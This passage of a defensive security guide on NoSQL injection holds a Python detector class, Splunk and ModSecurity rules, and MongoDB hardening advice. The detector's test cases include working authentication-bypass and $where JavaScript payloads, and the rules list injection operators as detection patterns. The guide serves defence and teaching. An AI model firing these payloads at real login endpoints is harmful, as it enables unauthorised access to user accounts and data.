            'source_ip': source_ip,
            'target_url': url,
            'detected_patterns': [],
            'injection_types': [],
            'operators_used': [],
            'risk_score': 0,
            'response_time': response_time,
            'should_block': False
        }

        # Pattern matching
        for injection_type, patterns in self.patterns.items():
            for pattern in patterns:
                matches = re.finditer(pattern, decoded_input, re.IGNORECASE)
                for match in matches:
                    detection_results['detected_patterns'].append({
                        'type': injection_type,
                        'pattern': pattern,
                        'match': match.group(),
                        'position': match.span()
                    })

                    if injection_type not in detection_results['injection_types']:
                        detection_results['injection_types'].append(injection_type)

                    if injection_type == 'mongodb_operators':
                        operator = match.group()
                        if operator not in detection_results['operators_used']:
                            detection_results['operators_used'].append(operator)

        # Calculate risk score
        detection_results['risk_score'] = self.calculate_risk_score(detection_results)

        # Behavioral analysis
        if detection_results['detected_patterns']:
            self.update_behavioral_tracking(source_ip, detection_results)
            detection_results['should_block'] = self.should_block_ip(source_ip)

            # Log to database
            self.log_attempt(detection_results, combined_input)

        return detection_results

    def calculate_risk_score(self, detection_results):
        """Calculate risk score based on detected patterns"""
        score = 0
        type_scores = {
            'mongodb_operators': 6,
            'javascript_injection': 9,
            'auth_bypass': 8,
            'couchdb_injection': 7,
            'time_based': 10
        }

        for pattern_data in detection_results['detected_patterns']:
            injection_type = pattern_data['type']
            score += type_scores.get(injection_type, 5)

        # Bonus for multiple operators
        operator_count = len(detection_results['operators_used'])
        if operator_count > self.thresholds['operators_per_request']:
            score += operator_count * 2

        # Bonus for multiple injection types
        if len(detection_results['injection_types']) > 1:
            score += len(detection_results['injection_types']) * 3

        # Time-based detection bonus
        if detection_results['response_time'] > self.thresholds['response_time_threshold']:
            score += 5

        return min(score, 100)  # Cap at 100

    def update_behavioral_tracking(self, source_ip, detection_results):
        """Update behavioral tracking for IP address"""
        current_time = datetime.now()

        # Clean old entries
        cutoff_time = current_time - timedelta(seconds=self.thresholds['time_window'])
        self.ip_activity[source_ip] = [
            attempt for attempt in self.ip_activity[source_ip]
            if attempt['timestamp'] > cutoff_time
        ]

        # Add new attempt
        self.ip_activity[source_ip].append({
            'timestamp': current_time,
            'risk_score': detection_results['risk_score'],
            'injection_types': detection_results['injection_types'],
            'operators_used': detection_results['operators_used']
        })

        # Update operator usage statistics
        for operator in detection_results['operators_used']:
            self.operator_usage[operator].append({
                'timestamp': current_time,
                'source_ip': source_ip
            })

    def should_block_ip(self, source_ip):
        """Determine if IP should be blocked based on behavioral analysis"""
        attempts = self.ip_activity.get(source_ip, [])

        # Too many attempts threshold
        if len(attempts) >= self.thresholds['requests_per_minute']:
            return True

        # Check for diverse operator usage
        all_operators = set()
        for attempt in attempts:
            all_operators.update(attempt['operators_used'])
        if len(all_operators) >= self.thresholds['unique_operators_per_ip']:
            return True

        # Check for high-risk patterns
        high_risk_count = sum(1 for attempt in attempts if attempt['risk_score'] >= 80)
        if high_risk_count >= 3:
            return True

        # Check for authentication bypass attempts
        auth_bypass_count = sum(1 for attempt in attempts
                               if 'auth_bypass' in attempt['injection_types'])
        if auth_bypass_count >= 5:
            return True

        return False

    def log_attempt(self, detection_results, payload):
        """Log attempt to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO nosql_attempts
            (timestamp, source_ip, target_url, payload, injection_type,
             operators_used, risk_score, response_time, blocked)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            detection_results['timestamp'],
            detection_results['source_ip'],
            detection_results['target_url'],
            payload[:500],  # Truncate long payloads
            ','.join(detection_results['injection_types']),
            ','.join(detection_results['operators_used']),
            detection_results['risk_score'],
            detection_results['response_time'],
            detection_results['should_block']
        ))

        # Update operator statistics
        for operator in detection_results['operators_used']:
            cursor.execute('''
                INSERT OR REPLACE INTO operator_stats
                (operator, usage_count, last_seen, associated_ips)
                VALUES (?,
                        COALESCE((SELECT usage_count FROM operator_stats WHERE operator = ?), 0) + 1,
                        ?, ?)
            ''', (
                operator,
                operator,
                detection_results['timestamp'],
                detection_results['source_ip']
            ))

        conn.commit()
        conn.close()

    def generate_report(self, hours=24):
        """Generate detection report"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cutoff_time = (datetime.now() - timedelta(hours=hours)).isoformat()

        # Get attack statistics
        cursor.execute('''
            SELECT injection_type, COUNT(*) as count, AVG(risk_score) as avg_risk
            FROM nosql_attempts
            WHERE timestamp > ?
            GROUP BY injection_type
            ORDER BY count DESC
        ''', (cutoff_time,))

        attack_stats = cursor.fetchall()

        # Get operator usage statistics
        cursor.execute('''
            SELECT operators_used, COUNT(*) as usage_count
            FROM nosql_attempts
            WHERE timestamp > ? AND operators_used != ""
            GROUP BY operators_used
            ORDER BY usage_count DESC
            LIMIT 10
        ''', (cutoff_time,))

        operator_stats = cursor.fetchall()

        # Get top attacking IPs
        cursor.execute('''
            SELECT source_ip, COUNT(*) as attempts, MAX(risk_score) as max_risk,
                   AVG(response_time) as avg_response_time
            FROM nosql_attempts
            WHERE timestamp > ?
            GROUP BY source_ip
            ORDER BY attempts DESC
            LIMIT 10
        ''', (cutoff_time,))

        top_ips = cursor.fetchall()

        conn.close()

        report = {
            'generated_at': datetime.now().isoformat(),
            'time_period_hours': hours,
            'attack_statistics': [
                {'type': row[0], 'count': row[1], 'avg_risk': row[2]}
                for row in attack_stats
            ],
            'operator_usage': [
                {'operators': row[0], 'count': row[1]}
                for row in operator_stats
            ],
            'top_attacking_ips': [
                {'ip': row[0], 'attempts': row[1], 'max_risk': row[2], 'avg_response_time': row[3]}
                for row in top_ips
            ]
        }

        return report

# Example usage and testing
def test_detector():
    """Test the NoSQL injection detector"""
    detector = NoSQLInjectionDetector()

    # Test cases
    test_requests = [
        {
            'ip': '192.168.1.100',
            'url': '/api/login',
            'params': {},
            'body': '{"email": {"$ne": null}, "password": {"$ne": null}}',
            'headers': {},
            'response_time': 0.5
        },
        {
            'ip': '192.168.1.101',
            'url': '/api/search',
            'params': {'query': '{"$where": "this.price > 0 || true"}'},
            'body': '',
            'headers': {},
            'response_time': 6.2
        },
        {
            'ip': '192.168.1.102',
            'url': '/api/users',
            'params': {'filter': '{"username": {"$regex": "^admin"}}'},
            'body': '',
            'headers': {},
            'response_time': 1.1
        }
    ]

    for i, request in enumerate(test_requests):
        print(f"\nTesting request {i+1}:")
        result = detector.analyze_request(request)

        if result['detected_patterns']:
            print(f"✗ NoSQL Injection detected from {result['source_ip']}")
            print(f"  Types: {', '.join(result['injection_types'])}")
            print(f"  Operators: {', '.join(result['operators_used'])}")
            print(f"  Risk Score: {result['risk_score']}")
            print(f"  Response Time: {result['response_time']}s")
            print(f"  Should Block: {result['should_block']}")
        else:
            print(f"✓ Clean request from {result['source_ip']}")

    # Generate report
    print("\n" + "="*50)
    print("DETECTION REPORT")
    print("="*50)

    report = detector.generate_report(hours=1)
    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    test_detector()
```

### Key Detection Metrics

**Behavioral Indicators:**

- **Multiple NoSQL operators per request**: ≥3 different operators in single query
- **Operator diversity from single IP**: ≥8 unique operators used
- **Rapid injection attempts**: >15 requests per minute
- **Authentication bypass patterns**: Multiple `$ne`, `$gt`, `$regex` combinations
- **JavaScript injection complexity**: Function definitions and time delays

**Network Signatures:**

- **MongoDB operators**: `$ne`, `$gt`, `$lt`, `$regex`, `$where`, `$exists`, `$in`, `$nin`
- **JavaScript patterns**: `function()`, `sleep()`, `this.`, `new Date`, `while()`
- **Authentication bypass**: `$ne null`, `$gt ""`, `$regex .*`, `$exists true`
- **CouchDB specific**: `_all_dbs`, `_users`, `startkey`, `endkey`
- **Time-based indicators**: Extended response times with sleep functions

**Response Analysis:**

- **HTTP 500 errors** with database error messages
- **Authentication responses** (200/401) to bypass attempts
- **Extended response times** for time-based attacks (>3 seconds)
- **Large response sizes** indicating successful data extraction
- **Error patterns** revealing database structure information

## Detection and Monitoring

### SIEM Rules for NoSQL Injection Detection

```sql
-- Splunk Detection Rule for NoSQL Injection
index=web_logs
| regex _raw="(?i)(\$ne|\$gt|\$lt|\$regex|\$where|\$exists|\$in|\$nin|\$or|\$and)"
| eval nosql_injection_score=0
| eval nosql_injection_score=if(match(_raw,"(?i)\$ne"),nosql_injection_score+2,nosql_injection_score)
| eval nosql_injection_score=if(match(_raw,"(?i)\$regex"),nosql_injection_score+3,nosql_injection_score)
| eval nosql_injection_score=if(match(_raw,"(?i)\$where"),nosql_injection_score+4,nosql_injection_score)
| eval nosql_injection_score=if(match(_raw,"(?i)sleep\("),nosql_injection_score+5,nosql_injection_score)
| where nosql_injection_score >= 3
| stats count by src_ip, uri_path, user_agent
| sort -count
```

### WAF Rules for NoSQL Injection Prevention

```apache
# NoSQL Injection Prevention Rules
SecRule ARGS "@rx (?i:\$(?:ne|gt|lt|gte|lte|regex|where|exists|in|nin|or|and|not|all|size|type|mod))" \
    "id:2001,\
    phase:2,\
    block,\
    msg:'NoSQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'attack-nosql'"

# Block JavaScript injection in NoSQL queries
SecRule ARGS "@rx (?i:(?:function\s*\(|sleep\s*\(|eval\s*\(|this\.|new\s+Date|while\s*\(|for\s*\())" \
    "id:2002,\
    phase:2,\
    block,\
    msg:'NoSQL JavaScript Injection Detected',\
    tag:'attack-nosql'"
```

## Mitigation Strategies

### 1. Input Validation and Sanitization

```javascript
// Vulnerable NoSQL query
const user = await db.collection('users').findOne({
  email: req.body.email,
  password: req.body.password,
});

// Secure NoSQL query with validation
function validateInput(input) {
  // Reject if input contains NoSQL operators
  const prohibited = ['$ne', '$gt', '$lt', '$regex', '$where', '$exists'];
  const inputStr = JSON.stringify(input);

  for (const operator of prohibited) {
    if (inputStr.includes(operator)) {
      throw new Error('Invalid input detected');
    }
  }

  return input;
}

const user = await db.collection('users').findOne({
  email: validateInput(req.body.email),
  password: validateInput(req.body.password),
});
```

### 2. Parameterized Queries and Schema Validation

```javascript
// Use schema validation
const userSchema = {
  email: { type: 'string', pattern: '^[\\w.-]+@[\\w.-]+\\.[a-zA-Z]{2,}$' },
  password: { type: 'string', minLength: 8 },
};

// Validate against schema before query
const validateData = (data, schema) => {
  // Implementation of schema validation
  return data;
};

const validatedData = validateData(req.body, userSchema);
```

### 3. Disable JavaScript Execution

```javascript
// MongoDB: Disable server-side JavaScript
// In mongod.conf
/*
security:
  javascriptEnabled: false
*/

// Or via command line
// mongod --noscripting
```

## Legal and Ethical Considerations

⚠️ **IMPORTANT DISCLAIMERS:**

1. **Authorization Required**: Only test applications you own or have explicit written permission to test
2. **Scope Limitations**: Stay within the defined scope of testing
3. **Data Protection**: Do not access, modify, or exfiltrate real user data
4. **Responsible Disclosure**: Report vulnerabilities through proper channels
5. **Legal Compliance**: Ensure testing complies with local laws and regulations

## References

- [OWASP NoSQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html)
- [MongoDB Security Best Practices](https://docs.mongodb.com/manual/security/)
- [CouchDB Security Documentation](https://docs.couchdb.org/en/stable/intro/security.html)
- [CWE-943: NoSQL Injection](https://cwe.mitre.org/data/definitions/943.html)

---

**Last Updated**: May 27, 2025  
**Version**: 1.0  
**Classification**: Internal Use Only
